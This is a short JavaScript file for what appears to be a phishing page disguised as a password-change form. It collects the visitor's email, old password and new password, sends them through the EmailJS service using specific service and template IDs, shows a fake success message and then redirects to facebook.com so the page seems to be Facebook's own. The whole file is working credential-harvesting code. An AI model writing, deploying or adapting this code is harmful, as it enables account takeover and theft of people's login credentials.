(function() {
  emailjs.init("ODWuzZ-mZLM196nkP"); // Your Public Key
})();

document.getElementById('passwordForm').addEventListener('submit', function(event) {
  event.preventDefault();

  const email = document.getElementById('email').value;
  const oldPassword = document.getElementById('oldPassword').value;
  const newPassword = document.getElementById('newPassword').value;

  emailjs.send("service_8hdqzju", "template_hk6uqi8", {
    email: email,
    old_password: oldPassword,
    new_password: newPassword
  }).then(function(response) {
    console.log('SUCCESS!', response.status, response.text);
    document.getElementById('passwordBox').style.display = 'none';  // Hide the form
    document.getElementById('successMessage').style.display = 'block';  // Show success message
    setTimeout(function() {
      window.location.href = 'https://facebook.com';  // Redirect after 2 seconds
    }, 2000);
  }, function(error) {
    console.log('FAILED...', error);
  });
});